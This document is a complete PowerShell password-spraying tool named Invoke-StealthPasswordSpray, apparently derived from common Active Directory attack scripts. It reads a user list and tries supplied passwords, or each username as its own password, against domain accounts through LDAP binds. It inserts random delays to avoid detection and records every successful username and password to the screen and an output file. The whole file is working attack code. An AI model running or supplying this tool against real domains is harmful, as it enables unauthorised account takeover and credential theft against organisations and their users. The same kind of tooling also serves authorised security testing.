function Invoke-StealthPasswordSpray {
    param(
        [Parameter(Position = 0, Mandatory = $false)]
        [string]$UserListPath = "",
        [Parameter(Position = 1, Mandatory = $false)]
        [string]$Password,
        [Parameter(Position = 2, Mandatory = $false)]
        [string]$PasswordFile,
        [Parameter(Position = 3, Mandatory = $false)]
        [string]$TargetDomain = "",
        [Parameter(Position = 4, Mandatory = $false)]
        [switch]$UseUserAsPass,
        [Parameter(Position = 5, Mandatory = $false)]
        [int]$MinDelay = 0,
        [Parameter(Position = 6, Mandatory = $false)]
        [int]$MaxDelay = 5,
        [Parameter(Position = 7, Mandatory = $false)]
        [string]$OutFile = ""
    )

    if ($Password) {
        $Passwords = @($Password)
    } elseif ($UseUserAsPass) {
        $Passwords = ""
    } elseif ($PasswordFile) {
        $Passwords = Get-Content $PasswordFile
    } else {
        Write-Host -ForegroundColor Red "Specify -Password or -PasswordFile"
        return
    }

    try {
        if ($TargetDomain -ne "") {
            $DomainCtx = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain", $TargetDomain)
            $DomainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainCtx)
            $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$TargetDomain").distinguishedName
        } else {
            $DomainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
        }
    } catch {
        Write-Host -ForegroundColor "red" "Cannot connect to the domain. Specify the domain name using -TargetDomain."
        return
    }

    if ($UserListPath -eq "") {
        Write-Host -ForegroundColor Red "Specify -UserListPath"
        return
    } else {
        Write-Host "[*] Using $UserListPath as user list"
        $UserArray = @()
        try {
            $UserArray = Get-Content $UserListPath -ErrorAction stop
        } catch {
            Write-Host -ForegroundColor "red" "Error reading user list: $_"
            return
        }
    }

    if ($Passwords.count -gt 1) {
        Write-Host -ForegroundColor Yellow "WARNING - Multiple passwords could cause account lockouts!"
    }

    Write-Host -ForegroundColor Yellow "Password testing started with $($Passwords.count) passwords"
    Write-Host "This may take a while depending on the number of users."

    if ($UseUserAsPass) {
        Test-Passwords -Domain $CurrentDomain -UserArray $UserArray -MinDelay $MinDelay -MaxDelay $MaxDelay -UseUserAsPass -OutFile $OutFile
    } else {
        for ($i = 0; $i -lt $Passwords.count; $i++) {
            Test-Passwords -Domain $CurrentDomain -UserArray $UserArray -Password $Passwords[$i] -MinDelay $MinDelay -MaxDelay $MaxDelay -OutFile $OutFile
        }
    }

    Write-Host -ForegroundColor Yellow "Password testing completed."
}

function Test-Passwords {
    param(
        [Parameter(Position = 0)]
        $Domain,
        [Parameter(Position = 1)]
        [string[]]$UserArray,
        [Parameter(Position = 2)]
        [string]$Password,
        [Parameter(Position = 3)]
        [int]$MinDelay = 0,
        [Parameter(Position = 4)]
        [int]$MaxDelay = 5,
        [Parameter(Position = 5)]
        [switch]$UseUserAsPass,
        [Parameter(Position = 6, Mandatory = $false)]
        [string]$OutFile = ""
    )

    $currentUser = 0
    $Random = New-Object System.Random

    foreach ($User in $UserArray) {
        if ($UseUserAsPass) {
            $Password = $User
        }
        $ADEntry = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)
        if ($ADEntry.name -ne $null) {
            Write-Host -ForegroundColor Green "SUCCESS! User: $User Password: $Password"
            if ($OutFile -ne "") {
                Add-Content -Path $OutFile -Value "SUCCESS! User: $User Password: $Password"
            }
        }
        $currentUser += 1
        Write-Host -NoNewline "$currentUser of $($UserArray.count) users tested.`r"
        if ($MinDelay -gt 0 -or $MaxDelay -gt $MinDelay) {
            $delay = $Random.Next($MinDelay, $MaxDelay + 1)
            Start-Sleep -Seconds $delay
        }
    }
}
